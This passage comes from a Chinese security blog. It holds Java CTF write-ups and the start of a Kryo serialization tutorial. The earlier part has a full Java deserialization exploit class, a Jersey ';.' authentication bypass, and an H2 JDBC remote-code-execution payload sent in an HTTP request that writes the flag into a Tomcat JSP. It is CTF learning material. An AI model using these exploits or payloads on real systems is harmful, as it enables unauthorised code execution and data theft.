class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        overrideJackson();<br>        <span class="hljs-type">byte</span>[] bytes = getshortclass(<span class="hljs-string">&quot;rm /a&quot;</span>);<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;  <span class="hljs-comment">//循环，让头部最小，为了拿到最短的payload</span><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> (TemplatesImpl) getTemplates(bytes);<br><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);   <span class="hljs-comment">//为了压缩链子长度，不使用动态代理，但可能会无法触发（小概率）。</span><br>            <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> getEventListenerList(pojoNode);<br><br>            <span class="hljs-comment">//二次反序列化</span><br>            <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> second_serialize(eventListenerList);<br><br>            <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>            <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList2</span> <span class="hljs-operator">=</span> getEventListenerList(pojoNode2);<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> serialize(eventListenerList2);<br>            System.out.println(a);<br>            System.out.println(a.length());<br>            <span class="hljs-keyword">if</span> (a.length()&lt;=<span class="hljs-number">1284</span>)&#123;<br>                deserialize(a);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SignedObject <span class="hljs-title function_">second_serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException &#123;<br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>((Serializable) o, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br>        <span class="hljs-keyword">return</span> signedObject;<br>    &#125;<br><br>    <span class="hljs-comment">//一条JDK toString链 readObject-&gt;toString</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> EventListenerList <span class="hljs-title function_">getEventListenerList</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br><br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(obj);<br><br>        setValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        <span class="hljs-keyword">return</span> eventListenerList;<br>    &#125;<br><br>    <span class="hljs-comment">//获取已实例化类中的值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">( <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>            <span class="hljs-keyword">if</span> (field != <span class="hljs-literal">null</span>)<br>                field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br><br>            <span class="hljs-keyword">return</span> field;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;<br>                <span class="hljs-keyword">return</span> getField(clazz.getSuperclass(), fieldName);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//重写jackson</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">overrideJackson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getTemplates</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <span class="hljs-comment">//这里也要为空</span><br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br><br>    <span class="hljs-comment">// 提供需要序列化的类，返回base64后的字节码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-comment">// 使用 Deflater 设置为最高压缩率</span><br>        <span class="hljs-type">Deflater</span> <span class="hljs-variable">deflater</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>(Deflater.BEST_COMPRESSION);<br>        <span class="hljs-type">DeflaterOutputStream</span> <span class="hljs-variable">deflaterOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeflaterOutputStream</span>(byteArrayOutputStream, deflater);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(deflaterOutputStream);<br>        objectOutputStream.writeObject(obj);<br><br>        <span class="hljs-comment">// 关闭流</span><br>        objectOutputStream.flush();<br>        deflaterOutputStream.finish();<br>        deflaterOutputStream.close();<br><br>        <span class="hljs-comment">// 转换为 Base64 字符串</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        <span class="hljs-keyword">return</span> poc;<br>    &#125;<br><br>    <span class="hljs-comment">//一个短的命令执行class，用javassist写的</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getshortclass(String cmd) <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[] bytes = clazz.toBytecode();<br>        <span class="hljs-keyword">return</span> cleanBytecode(bytes);<br>    &#125;<br><br>    <span class="hljs-comment">//用 ASM 进行二次清洗少量无用指令。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] cleanBytecode(<span class="hljs-type">byte</span>[] classBytes) &#123;<br>        <span class="hljs-type">ClassReader</span> <span class="hljs-variable">cr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(classBytes);<br>        <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(ClassWriter.COMPUTE_FRAMES);<br>        <span class="hljs-type">ClassVisitor</span> <span class="hljs-variable">cv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassVisitor</span>(Opcodes.ASM9, cw) &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, String descriptor, String signature, String[] exceptions)</span> &#123;<br>                <span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, descriptor, signature, exceptions);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(Opcodes.ASM9, mv) &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitLineNumber</span><span class="hljs-params">(<span class="hljs-type">int</span> line, Label start)</span> &#123;<br>                        <span class="hljs-comment">// Skip line numbers</span><br>                    &#125;<br>                &#125;;<br>            &#125;<br>        &#125;;<br>        cr.accept(cv, ClassReader.SKIP_FRAMES | ClassReader.SKIP_DEBUG);<br>        <span class="hljs-keyword">return</span> cw.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="DASCTF2025上半年-泽西岛"><a href="#DASCTF2025上半年-泽西岛" class="headerlink" title="DASCTF2025上半年-泽西岛"></a>DASCTF2025上半年-泽西岛</h2><p>jdk17下的h2，审源码和看名字就知道跟这里的jersey框架有关。</p><p>在这里还学了一手war包的debug，其实就是放tomcat里然后IDEA用Remote连localhost，就可以直接调了。</p><p>如果直接看源码，jadx或者jd-gui反编译就可以看到了。在WEB-INF目录下就是源码：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250806165815746.png" alt="image-20250806165815746"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250806165931650.png" alt="image-20250806165931650"></p><p>很显然要绕一个JWT鉴权，但是key是随机值，而且太长没法爆破，该怎么办呢？</p><p>突破口在于jersey的一个路由解析逻辑问题，可以参考：</p><p><a href="https://forum.butian.net/article/685">奇安信攻防社区-CVE-2024-56325: Apache Pinot Authentication bypass 漏洞分析</a></p><p>[Apache Pinot CVE-2024-56325 Authentication Bypass 漏洞分析 | ph0ebus’s Blog](<a href="https://blog.ph0ebus.cn/2025/04/03/Apache">https://blog.ph0ebus.cn/2025/04/03/Apache</a> Pinot CVE-2024-56325 Authentication Bypass 漏洞分析&#x2F;)</p><p>我们跟进到<code>org.glassfish.jersey.server.internal.routing.SingleMatchResult#stripMatrixParams</code>：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250806170212126.png" alt="image-20250806170212126"></p><p>这里会把传入的路径放到此处处理，而处理的逻辑会忽略 <code>;</code>和<code>/</code>之间的内容，包括<code>;</code>，如果 <code>;</code>后面没有下一个<code>/</code>则忽略之后所有内容。</p><p>例如 <code>/aaa;bbb/cccc;dddd</code>传入该函数后会返回 <code>/aaa/ccc</code>。如果不清楚自己本地调一下就知道了。</p><p>所以这里的bypass就有思路了，可以看到认证filter除了白名单路由可以无需认证外，如果满足不含<code>/</code>和且含<code>.</code>的要求，也可以无需认证的。</p><p>那么结合这里对传入路径的处理，我们只需要在访问的路径后面加入<code>;.</code>即可绕过认证。</p><p>以及如果翻到它自己的一个github commit也能知道个大概思路了：<a href="https://github.com/dataease/dataease/commit/dd35752f298b1a4079d9993b622220d321b0c8a6">fix: 【漏洞】Dataease H2 JDBC RCE Bypass · dataease&#x2F;dataease@dd35752 · GitHub</a></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250806171712599.png" alt="image-20250806171712599"></p><p>后续就是一个简单的常规jdk17-h2-rce：</p><p><a href="https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html">扒一扒h2database远程代码执行 | 离别歌</a></p><p>注意环境是jdk17，由于高版本JDK失去了Nashorn，于是需要通过非javascript的方式执行命令，直接用JavaScript引擎就不行了。</p><p>还有注意传入的jdbcUrl拼接了一个<code>;FORBID_CREATION=TRUE</code> 这个作用是限制禁止创建数据库，使我们不能再使用In-Memory内存数据库，因为使用内存数据库也是在“创建”数据库。</p><p>参考p牛的blog，可知如果<strong>将分号使用反斜线转义，分号就会变成一个普通字符串</strong>。</p><p>那么我们直接在JDBC URL字符串最末尾加一个反斜杠<code>\</code>，用于转义<code>;FORBID_CREATION=TRUE</code>最前面的分号，就让这个属性失效了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;INIT=CREATE ALIAS EXEC AS <span class="hljs-string">&#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#x27;</span>\;CALL <span class="hljs-title function_">EXEC</span> <span class="hljs-params">(<span class="hljs-string">&#x27;calc&#x27;</span>)</span>\;;AUTHZPWD=\<br></code></pre></td></tr></table></figure><p>靶机不出网，没法反弹shell，但是可以执行任意命令并写到到webapps下的jsp文件，或者直接写🐎。比如写到404.jsp这种，官方就这么做的：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/testConnect;.</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">X-Authorization</span><span class="hljs-punctuation">: </span>whoami<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-pgsql">jdbcUrl=jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;INI\T=<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">ALIAS</span> EXEC <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#x27;</span>\;<span class="hljs-keyword">CALL</span> EXEC (<span class="hljs-string">&#x27;bash -c &#123;echo,Y2F0IC9mbGFnID4gJENBVEFMSU5BX0hPTUUvd2ViYXBwcy9ST09ULzQwNC5qc3A\=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)\;;AUTHZPWD=\</span><br></code></pre></td></tr></table></figure><p>base64数据为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /flag &gt; <span class="hljs-variable">$CATALINA_HOME</span>/webapps/ROOT/404.jsp<br></code></pre></td></tr></table></figure><p>这里一个很巧妙的利用$CATALINA_HOME确定tomcat的根目录trick值得学一下hhh</p><p>参考：</p><p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/bkp6ldnifm2k3o1a#cC8ZK">DASCTF2025 上半年赛官方WP</a></p><p><a href="https://mp.weixin.qq.com/s/laMT4-M00t8xAY_Autdb3A?poc_token=HJIak2ijkpleIzCX6uJ4XIKHq6BgywZs9V-dSD_9">2025-DASCTF 2025上半年赛-泽西岛</a></p><p><a href="https://blog.csdn.net/taiyangdao/article/details/81979971">Jersey的Filter详解_jersey 配置filter-CSDN博客</a></p><p>（未完待续….）</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kryo</title>
    <link href="/2024/08/14/Kyro/"/>
    <url>/2024/08/14/Kyro/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来想缓两天再写Hessian的，但是被卷到了emmm。</p><p>讨厌卷狗。</p><p>Hessian太多了，一次写不完的，那我这次就写写Kryo吧，下次写表达式注入SSTI之类的，Hessian遥遥无期了hhhh。</p><p>Kryo 是一个快速序列化&#x2F;反序列化工具，依赖于字节码生成机制（底层使用了 ASM 库)，因此在序列化速度上有一定的优势，但正因如此，其使用也只能限制在基于 JVM 的语言上（Scala、Kotlin）</p><p>其他类似的序列化工具：原生JDK、Hessian、FTS</p><p>官方文档：<a href="https://github.com/EsotericSoftware/kryo">https://github.com/EsotericSoftware/kryo</a></p><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>待序列化目标类MyClass：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>    <span class="hljs-keyword">public</span> String hello;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> num;<br>   <span class="hljs-comment">// 省略getter、setter、toString</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.esotericsoftware.kryo.Kryo;<br><span class="hljs-keyword">import</span> com.esotericsoftware.kryo.io.Input;<br><span class="hljs-keyword">import</span> com.esotericsoftware.kryo.io.Output;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Kryo</span> <span class="hljs-variable">kryo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Kryo</span>();<br>        kryo.register(MyClass.class);<br>        <span class="hljs-type">MyClass</span> <span class="hljs-variable">myClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br>        myClass.setHello(<span class="hljs-string">&quot;Hello Kryo&quot;</span>);<br>        myClass.setNum(<span class="hljs-number">11</span>);<br><br>        <span class="hljs-type">Output</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;file.bin&quot;</span>)));<br>        kryo.writeObject(output, myClass);<br>        output.close();<br><br>        <span class="hljs-type">Input</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Input</span>(Files.newInputStream(Paths.get(<span class="hljs-string">&quot;file.bin&quot;</span>)));<br>        <span class="hljs-type">MyClass</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> kryo.readObject(input, MyClass.class);<br>        input.close();<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// MyClass&#123;hello=&#x27;Hello Kryo&#x27;, num=11&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Ser-Deser"><a href="#Ser-Deser" class="headerlink" title="Ser &amp; Deser"></a>Ser &amp; Deser</h2><p><code>Kryo</code>提供了三组方法来读写对象</p><blockquote><ul><li>类未知且对象可能为null</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.writeClassAndObject(output, object);<br><span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> kryo.readClassAndObject(input);<br></code></pre></td></tr></table></figure><ul><li>类已知且对象可能为null</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.writeObjectOrNull(output, object);<br><span class="hljs-type">SomeClass</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> kryo.readObjectOrNull(input, SomeClass.class);<br></code></pre></td></tr></table></figure><ul><li>类已知且对象不为null</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.writeObject(output, object);<br><span class="hljs-type">SomeClass</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> kryo.readObject(input, SomeClass.class);<br></code></pre></td></tr></table></figure></blockquote><p>这些方法首先都是找到合适的序列化器（serializer），再进行序列化或反序列化，序列化器会递归地调用这些方法。</p><h3 id="Kryo的注册"><a href="#Kryo的注册" class="headerlink" title="Kryo的注册"></a>Kryo的注册</h3><p>Kryo为了提供性能和减小序列化结果体积，提供注册序列化对象类的方式。</p><p>在注册时，会为该序列化类生成int ID, 后续在序列化时使用int ID唯一标识该类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.register(SomeClass.class);<br></code></pre></td></tr></table></figure><h3 id="序列化流程"><a href="#序列化流程" class="headerlink" title="序列化流程"></a>序列化流程</h3><p>跟进<code>writeClassAndObject</code>：</p><p><img src="/2024/08/14/Kyro/image-20240814215655799.png" alt="image-20240814215655799"></p><h4 id="Registration获取"><a href="#Registration获取" class="headerlink" 